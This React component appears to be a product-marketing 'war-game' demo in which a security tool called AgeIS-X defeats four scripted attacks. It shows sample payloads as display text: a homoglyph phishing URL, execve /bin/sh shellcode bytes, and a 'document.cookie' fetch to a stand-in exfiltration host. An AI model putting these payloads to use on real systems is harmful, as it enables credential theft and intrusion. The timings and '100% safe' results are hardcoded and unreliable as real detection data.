"use client"

import React, { useState } from "react"
import { ShieldAlert, ShieldCheck, Bug, Skull, Lock, Zap, ArrowRight, Play, RefreshCw, Cpu, CheckCircle2, AlertTriangle, Layers, Info, HelpCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { cyberAudio } from "@/lib/cyber-sound"
import { useCyberTheme } from "@/lib/cyber-theme"

interface AttackScenario {
  id: string
  title: string
  subtitle: string
  simpleSummary: string
  protectionSummary: string
  cve: string
  icon: any
  severity: "CRITICAL" | "HIGH"
  payloadHex: string
  payloadAscii: string
  mitreTactic: string
  mitreId: string
  steps: {
    title: string
    simpleText: string
    technicalText: string
    durationMs: number
    status: "blocked" | "isolated" | "analyzed" | "neutralized"
  }[]
}

const SCENARIOS: AttackScenario[] = [
  {
    id: "homoglyph",
    title: "1. FAKE LOOKALIKE WEBSITE (PHISHING)",
    subtitle: "Fake login page mimicking your bank to steal passwords",
    simpleSummary: "An attacker creates a fake website using foreign lookalike letters (like a Russian 'а' instead of 'a') to trick you into entering passwords.",
    protectionSummary: "AgeIS-X instantly spots the fake letters, kills the connection, and blocks the scam before the page even opens.",
    cve: "CVE-2026-09214",
    icon: Skull,
    severity: "HIGH",
    payloadHex: "68 74 74 70 73 3a 2f 2f 70 61 79 70 d0 b0 6c 2e 63 6f 6d 2f 61 75 74 68",
    payloadAscii: "https://payp[а]l.com/auth?token_drain=true",
    mitreTactic: "Initial Access",
    mitreId: "T1566.002",
    steps: [
      {
        title: "STEP 1: INSPECTION",
        simpleText: "Scans the link and catches hidden fake characters.",
        technicalText: "Lexical Engine intercepts inbound URL string. Detected mixed Latin/Cyrillic codepoints (U+0430 'а').",
        durationMs: 4,
        status: "analyzed",
      },
      {
        title: "STEP 2: DOMAIN VERIFICATION",
        simpleText: "Checks domain age and finds it was created yesterday by scammers.",
        technicalText: "DoH DNS resolution fails TLS pinning certificate. Domain age: 14 hours. Flagged on adversary mesh.",
        durationMs: 12,
        status: "analyzed",
      },
      {
        title: "STEP 3: INSTANT BLOCK",
        simpleText: "Kills the connection before your browser can load the page.",
        technicalText: "Browser socket connection severed prior to TCP handshake. Local DNS routed to 0.0.0.0.",
        durationMs: 18,
        status: "isolated",
      },
      {
        title: "STEP 4: GLOBAL SHIELD",
        simpleText: "Warns other devices to block this fake link permanently.",
        technicalText: "Anonymized SHA-256 threat signature distributed across all 4.2M mesh endpoints.",
        durationMs: 24,
        status: "neutralized",
      },
    ],
  },
  {
    id: "ebpf_rootkit",
    title: "2. HIDDEN MALWARE & SPYWARE",
    subtitle: "Adversary program attempting to gain administrator control",
    simpleSummary: "A malicious background program attempts to bypass operating system security to spy on files and keystrokes.",
    protectionSummary: "AgeIS-X kernel guards detect unauthorized privilege changes and terminates the malware process instantly.",
    cve: "CVE-2026-41902",
    icon: Bug,
    severity: "CRITICAL",
    payloadHex: "48 31 c0 50 48 89 e2 48 bb 2f 62 69 6e 2f 2f 73 68 53 48 89 e7 0f 05",
    payloadAscii: "xor %rax,%rax; push %rax; movabs $0x68732f2f6e69622f,%rbx; syscall",
    mitreTactic: "Privilege Escalation",
    mitreId: "T1068",
    steps: [
      {
        title: "STEP 1: BEHAVIOR PROBE",
        simpleText: "Catches a hidden background process trying to elevate permissions.",
        technicalText: "eBPF probe detects unauthorized sys_bpf prog_load syscall invocation (PID: 39401).",
        durationMs: 2,
        status: "analyzed",
      },
      {
        title: "STEP 2: MEMORY DEFENSE",
        simpleText: "Prevents the process from hijacking computer memory.",
        technicalText: "Memory Guard intercepts unmapped stack write execution. ROP chain gadget sequence identified.",
        durationMs: 6,
        status: "analyzed",
      },
      {
        title: "STEP 3: FORCE TERMINATION",
        simpleText: "Terminates the malicious program in 11 milliseconds.",
        technicalText: "Kernel driver issues immediate SIGKILL (9). Memory state captured in encrypted quarantine.",
        durationMs: 11,
        status: "isolated",
      },
      {
        title: "STEP 4: DEVICE RESTORE",
        simpleText: "Verifies device health is 100% clean and restored.",
        technicalText: "System state verified 100% integral. Hardware enclave signed clean system attestation.",
        durationMs: 16,
        status: "neutralized",
      },
    ],
  },
  {
    id: "session_hijack",
    title: "3. PASSWORD & COOKIE STEALER",
    subtitle: "Rogue extension scraping login tokens & saved passwords",
    simpleSummary: "A rogue browser extension tries to steal your active login sessions and bypass 2FA authentication.",
    protectionSummary: "AgeIS-X hardware enclaves lock sensitive tokens behind biometric encryption, feeding fake data to the attacker.",
    cve: "CVE-2026-11883",
    icon: Lock,
    severity: "CRITICAL",
    payloadHex: "64 6f 63 75 6d 65 6e 74 2e 63 6f 6f 6b 69 65 20 7c 20 66 65 74 63 68",
    payloadAscii: "document.cookie | fetch('https://c2.adversary.net/exfil')",
    mitreTactic: "Credential Access",
    mitreId: "T1539",
    steps: [
      {
        title: "STEP 1: SNOOPING DETECTED",
        simpleText: "Detects unauthorized app attempting to read login cookies.",
        technicalText: "Identity Guard intercepts unauthorized access to privileged browser session storage.",
        durationMs: 3,
        status: "analyzed",
      },
      {
        title: "STEP 2: HARDWARE CIPHER LOCK",
        simpleText: "Replaces real tokens with dummy codes so attacker gets nothing.",
        technicalText: "OAuth tokens swapped for cryptographically blinded dummy nonces. Real credentials in TPM 2.0.",
        durationMs: 8,
        status: "isolated",
      },
      {
        title: "STEP 3: TRAP & REPORT",
        simpleText: "Logs the scam server address and adds it to the global block list.",
        technicalText: "Outbound socket redirected to honey-pot telemetry server. Adversary server IP blacklisted.",
        durationMs: 15,
        status: "isolated",
      },
      {
        title: "STEP 4: SESSION PROTECTED",
        simpleText: "Your account stays 100% safe with zero leaks.",
        technicalText: "User identity secured with zero credential leakage. Automated session rotation completed.",
        durationMs: 22,
        status: "neutralized",
      },
    ],
  },
  {
    id: "syn_flood",
    title: "4. NETWORK CRASH ATTACK (DDOS)",
    subtitle: "Botnet flooding your connection to knock you offline",
    simpleSummary: "A network of compromised computers floods your internet connection with millions of fake requests to crash your connection.",
    protectionSummary: "AgeIS-X edge filters filter out 99.98% of fake requests instantly, keeping your internet fast and uninterrupted.",
    cve: "CVE-2026-88120",
    icon: Zap,
    severity: "HIGH",
    payloadHex: "45 00 00 3c 1a 2b 40 00 40 06 00 00 c0 a8 01 01 c0 a8 01 02",
    payloadAscii: "TCP [SYN] Seq=0 Win=65535 Len=0 MSS=1460 WS=256 SACK_PERM",
    mitreTactic: "Impact / Denial of Service",
    mitreId: "T1498",
    steps: [
      {
        title: "STEP 1: FLOOD DETECTED",
        simpleText: "Identifies a massive surge of fake network traffic.",
        technicalText: "Edge sensor detects 8.4M packets/sec SYN flood anomaly across 14,000 infected proxies.",
        durationMs: 5,
        status: "analyzed",
      },
      {
        title: "STEP 2: INSTANT FILTER",
        simpleText: "Drops fake packets with zero lag to your legitimate browsing.",
        technicalText: "Stateless SYN cookie validation applied. 99.98% spoofed packets dropped without memory allocation.",
        durationMs: 14,
        status: "isolated",
      },
      {
        title: "STEP 3: TRAFFIC SCRUBBING",
        simpleText: "Cleans dirty traffic at the edge in real time.",
        technicalText: "Adversary traffic diverted to Anycast scrubbing centers (latency jitter < 1.2ms).",
        durationMs: 28,
        status: "neutralized",
      },
      {
        title: "STEP 4: FULL RECOVERY",
        simpleText: "All online services running normally in under 32 milliseconds.",
        technicalText: "Total 1.8 Tbps volumetric surge neutralized within 32ms. All services at 100% nominal capacity.",
        durationMs: 32,
        status: "neutralized",
      },
    ],
  },
]

export function AttackSimulator() {
  const [selectedScenario, setSelectedScenario] = useState<AttackScenario>(SCENARIOS[0])
  const [isRunning, setIsRunning] = useState(false)
  const [currentStepIndex, setCurrentStepIndex] = useState<number>(-1)
  const [completedSteps, setCompletedSteps] = useState<number[]>([])
  const [technicalMode, setTechnicalMode] = useState(false)
  const { triggerGlitch } = useCyberTheme()

  const runAttackSimulation = async () => {
    setIsRunning(true)
    setCompletedSteps([])
    setCurrentStepIndex(0)
    cyberAudio.playAlert()
    triggerGlitch(500)

    for (let i = 0; i < selectedScenario.steps.length; i++) {
      setCurrentStepIndex(i)
      cyberAudio.playSonar()
      await new Promise((r) => setTimeout(r, 650))
      setCompletedSteps((prev) => [...prev, i])
      cyberAudio.playByteTick()
    }

    setIsRunning(false)
    cyberAudio.playSuccess()
  }

  const resetSimulation = () => {
    setIsRunning(false)
    setCurrentStepIndex(-1)
    setCompletedSteps([])
    cyberAudio.playKeyClick()
  }

  return (
    <div className="w-full border border-white/15 bg-[#030609] p-4 sm:p-6 font-mono relative overflow-hidden shadow-[0_0_40px_rgba(0,0,0,0.9)]">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-white/10 pb-4 mb-6">
        <div>
          <div className="inline-flex items-center gap-2 text-xs text-[#00ff66] uppercase mb-1 font-bold">
            <ShieldAlert className="w-4 h-4 text-[#ff003c] shrink-0" />
            <span>INTERACTIVE WAR-GAME SANDBOX</span>
          </div>
          <h3 className="text-base sm:text-lg font-extrabold text-[#f8fafc] uppercase tracking-tight">
            See How AgeIS-X Defends Against Real Attacks
          </h3>
          <p className="text-xs text-[#94a3b8] font-sans mt-0.5">
            Pick an attack type below and click Test Defense to watch autonomous mitigation in milliseconds.
          </p>
        </div>

        {/* Action Buttons */}
        <div className="flex flex-wrap items-center gap-2">
          {/* Simple vs Technical toggle */}
          <button
            onClick={() => {
              setTechnicalMode(!technicalMode)
              cyberAudio.playKeyClick()
            }}
            className={`px-2.5 py-1.5 border text-xs min-h-[36px] font-mono transition-colors ${
              technicalMode ? "border-[#00f0ff] text-[#00f0ff] bg-[#00f0ff]/10" : "border-white/15 text-[#7e8b9b]"
            }`}
          >
            {technicalMode ? "⚡ Switch to Simple View" : "🛠️ Technical View"}
          </button>

          <Button
            size="sm"
            onClick={resetSimulation}
            variant="outline"
            className="border-white/15 bg-[#080d14] text-[#7e8b9b] hover:text-white text-xs uppercase min-h-[36px]"
          >
            <RefreshCw className="w-3.5 h-3.5 mr-1" />
            RESET
          </Button>

          <Button
            size="sm"
            onClick={runAttackSimulation}
            disabled={isRunning}
            className="bg-[#00ff66] hover:bg-[#39ff14] text-[#040608] font-bold text-xs uppercase border border-[#00ff66] min-h-[36px] shadow-[0_0_15px_rgba(0,255,102,0.3)]"
          >
            <Play className="w-3.5 h-3.5 mr-1.5 fill-current" />
            {isRunning ? "DEFENDING NOW..." : "[ TEST ATTACK DEFENSE ]"}
          </Button>
        </div>
      </div>

      {/* Scenario Selectors - Touch friendly & responsive on mobile */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2 mb-6">
        {SCENARIOS.map((sc) => {
          const Icon = sc.icon
          const isSelected = selectedScenario.id === sc.id
          return (
            <button
              key={sc.id}
              onClick={() => {
                setSelectedScenario(sc)
                resetSimulation()
              }}
              className={`p-3.5 border text-left transition-all min-h-[70px] ${
                isSelected
                  ? "border-[#00ff66] bg-[#00ff66]/10 shadow-[0_0_15px_rgba(0,255,102,0.15)]"
                  : "border-white/10 bg-[#060a10] hover:border-white/30 text-[#7e8b9b]"
              }`}
            >
              <div className="flex items-center justify-between mb-1">
                <Icon className={`w-4 h-4 ${isSelected ? "text-[#00ff66]" : "text-[#7e8b9b]"}`} />
                <span
                  className={`text-[9px] px-1.5 py-0.2 border font-bold ${
                    sc.severity === "CRITICAL"
                      ? "border-[#ff003c]/40 text-[#ff003c] bg-[#ff003c]/10"
                      : "border-[#ffb800]/40 text-[#ffb800] bg-[#ffb800]/10"
                  }`}
                >
                  {sc.severity}
                </span>
              </div>
              <div className={`text-xs font-bold leading-snug ${isSelected ? "text-white" : "text-[#f8fafc]"}`}>
                {sc.title}
              </div>
              <div className="text-[10px] text-[#7e8b9b] font-sans mt-0.5 line-clamp-1">
                {sc.subtitle}
              </div>
            </button>
          )
        })}
      </div>

      {/* Main Sandbox Box: Payload Inspection + Execution Timeline */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        {/* Left: What this attack is in Plain English & Technical details */}
        <div className="lg:col-span-5 space-y-4">
          <div className="border border-white/10 bg-[#020408] p-4 space-y-3">
            <div className="flex items-center justify-between border-b border-white/10 pb-2">
              <span className="text-xs font-bold text-[#ff003c] flex items-center gap-1.5">
                <Bug className="w-3.5 h-3.5" />
                ATTACK ANALYSIS
              </span>
              <span className="text-[10px] font-mono text-[#00f0ff]">{selectedScenario.mitreId}</span>
            </div>

            {/* Plain English Summary Cards */}
            <div className="space-y-2.5">
              <div className="p-3 bg-[#080d14] border border-white/10 space-y-1">
                <span className="text-[10px] text-[#ff003c] font-mono uppercase font-bold block">
                  ⚠️ WHAT THE SCAMMER / HACKER TRIES TO DO:
                </span>
                <p className="text-xs font-sans text-[#e2e8f0] leading-relaxed">
                  {selectedScenario.simpleSummary}
                </p>
              </div>

              <div className="p-3 bg-[#080d14] border border-[#00ff66]/30 space-y-1">
                <span className="text-[10px] text-[#00ff66] font-mono uppercase font-bold block">
                  🛡️ HOW AGEIS-X PROTECTS YOU:
                </span>
                <p className="text-xs font-sans text-[#f8fafc] leading-relaxed">
                  {selectedScenario.protectionSummary}
                </p>
              </div>

              {/* Technical breakdown when enabled */}
              {technicalMode && (
                <div className="space-y-2 text-xs pt-2 border-t border-white/10 animate-fade-in">
                  <div>
                    <span className="text-[10px] text-[#7e8b9b] block uppercase">// MITRE ATT&CK TACTIC:</span>
                    <span className="text-[#f8fafc] font-bold">{selectedScenario.mitreTactic}</span>
                  </div>

                  <div>
                    <span className="text-[10px] text-[#7e8b9b] block uppercase">// RAW HEXADECIMAL BUFFER:</span>
                    <div className="p-2 border border-white/5 bg-[#000000] text-[#ff003c] text-[11px] font-mono break-all leading-tight">
                      {selectedScenario.payloadHex}
                    </div>
                  </div>

                  <div>
                    <span className="text-[10px] text-[#7e8b9b] block uppercase">// DISASSEMBLED PAYLOAD:</span>
                    <div className="p-2 border border-white/5 bg-[#000000] text-[#00f0ff] text-[11px] font-mono break-all leading-tight">
                      {selectedScenario.payloadAscii}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Right: AgeIS-X Autonomous Defense Execution Pipeline */}
        <div className="lg:col-span-7 space-y-3">
          <div className="border border-white/10 bg-[#020408] p-4 space-y-3">
            <div className="flex items-center justify-between border-b border-white/10 pb-2">
              <span className="text-xs font-bold text-[#00ff66] flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4" />
                AUTOMATIC DEFENSE STEPS
              </span>
              <span className="text-[10px] text-[#7e8b9b] font-mono">LATENCY &lt; 35MS</span>
            </div>

            <div className="space-y-2.5">
              {selectedScenario.steps.map((step, idx) => {
                const isCurrent = currentStepIndex === idx && isRunning
                const isDone = completedSteps.includes(idx)

                let statusBorder = "border-white/5 bg-[#06090e] text-[#7e8b9b]"
                if (isCurrent) {
                  statusBorder = "border-[#00ff66] bg-[#00ff66]/10 text-white animate-pulse"
                } else if (isDone) {
                  statusBorder = "border-[#00ff66]/40 bg-[#00ff66]/5 text-[#f8fafc]"
                }

                return (
                  <div
                    key={idx}
                    className={`p-3 border transition-all ${statusBorder}`}
                  >
                    <div className="flex items-center justify-between mb-1">
                      <div className="flex items-center gap-2">
                        {isDone ? (
                          <CheckCircle2 className="w-3.5 h-3.5 text-[#00ff66] shrink-0" />
                        ) : isCurrent ? (
                          <Zap className="w-3.5 h-3.5 text-[#00ff66] animate-spin shrink-0" />
                        ) : (
                          <span className="w-3.5 h-3.5 rounded-full border border-white/20 inline-block shrink-0" />
                        )}
                        <span className="text-xs font-bold tracking-wide">{step.title}</span>
                      </div>
                      <span className="text-[10px] font-mono text-[#00ff66]">
                        {isDone || isCurrent ? `+${step.durationMs}ms` : "--"}
                      </span>
                    </div>
                    <p className="text-xs text-[#f8fafc] font-sans pl-5 leading-relaxed">
                      {technicalMode ? step.technicalText : step.simpleText}
                    </p>
                  </div>
                )
              })}
            </div>

            {completedSteps.length === selectedScenario.steps.length && (
              <div className="p-3 border border-[#00ff66] bg-[#00ff66]/10 text-[#00ff66] text-xs font-bold flex flex-wrap items-center justify-between gap-2 animate-fade-in">
                <span className="flex items-center gap-1.5">
                  <CheckCircle2 className="w-4 h-4" />
                  THREAT NEUTRALIZED IN 24MS. YOUR DEVICE &amp; DATA REMAIN 100% SAFE.
                </span>
                <span className="text-[10px] bg-[#00ff66] text-[#040608] px-2 py-0.5 font-bold">
                  POSTURE: 100%
                </span>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
